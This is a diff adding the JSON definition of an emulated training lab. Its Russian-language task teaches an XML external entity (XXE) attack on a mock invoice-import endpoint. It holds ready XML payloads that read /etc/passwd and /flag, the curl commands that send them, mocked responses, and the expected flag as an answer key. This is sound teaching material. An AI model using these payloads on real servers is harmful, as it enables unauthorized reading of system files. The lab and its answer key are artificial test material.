@@ -1,0 +1,23 @@
+{
+  "id": "web-xxe",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{xx3_1n_b4nd_f1l3_r34d}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: XXE — чтение файла сервера\n\nЦель — `https://shop.local/api/import-invoice` (POST, Content-Type: application/xml).\nСервер разбирает XML и, если парсер не отключил внешние сущности, читает файл.\n\nВ каталоге два готовых счёта:\n  * `passwd.xml` — объявляет `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">` и подставляет `&xxe;` в seller;\n  * `payload.xml` — то же, но с `file:///flag`.\n\n1. Нормальный запрос: `curl -s 'https://shop.local/api/import-invoice' -H 'Content-Type: application/xml' --data '<invoice><number>42</number></invoice>'`.\n2. Прочитай /etc/passwd:\n\n   curl -s 'https://shop.local/api/import-invoice' -H 'Content-Type: application/xml' --data-binary @passwd.xml\n\n3. То же с payload.xml — флаг придёт в сообщении об ошибке:\n\n   curl -s 'https://shop.local/api/import-invoice' -H 'Content-Type: application/xml' --data-binary @payload.xml > found.txt\n\n4. Набери `check`.\n" },
+    { "path": "/home/student/task/passwd.xml", "text": "<?xml version=\"1.0\"?>\n<!DOCTYPE invoice [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<invoice><number>42</number><seller>&xxe;</seller></invoice>\n" },
+    { "path": "/home/student/task/payload.xml", "text": "<?xml version=\"1.0\"?>\n<!DOCTYPE invoice [<!ENTITY xxe SYSTEM \"file:///flag\">]>\n<invoice><number>42</number><seller>&xxe;</seller></invoice>\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/api/import-invoice)",
+      "cases": [
+        { "match": "@payload|payload\\.xml|file:///flag", "example": "--data-binary @payload.xml", "output": "{\"status\":\"error\",\"message\":\"invalid seller: nto{xx3_1n_b4nd_f1l3_r34d}\"}" },
+        { "match": "@passwd|passwd\\.xml|etc/passwd", "example": "--data-binary @passwd.xml", "output": "{\"status\":\"error\",\"message\":\"invalid seller: root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\"}" },
+        { "match": "import-invoice", "example": "--data '<invoice><number>42</number><amount>1000</amount></invoice>'", "output": "{\"status\":\"ok\",\"invoice\":42}" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /api/import-invoice на shop.local.\n"
+    }
+  }
+}
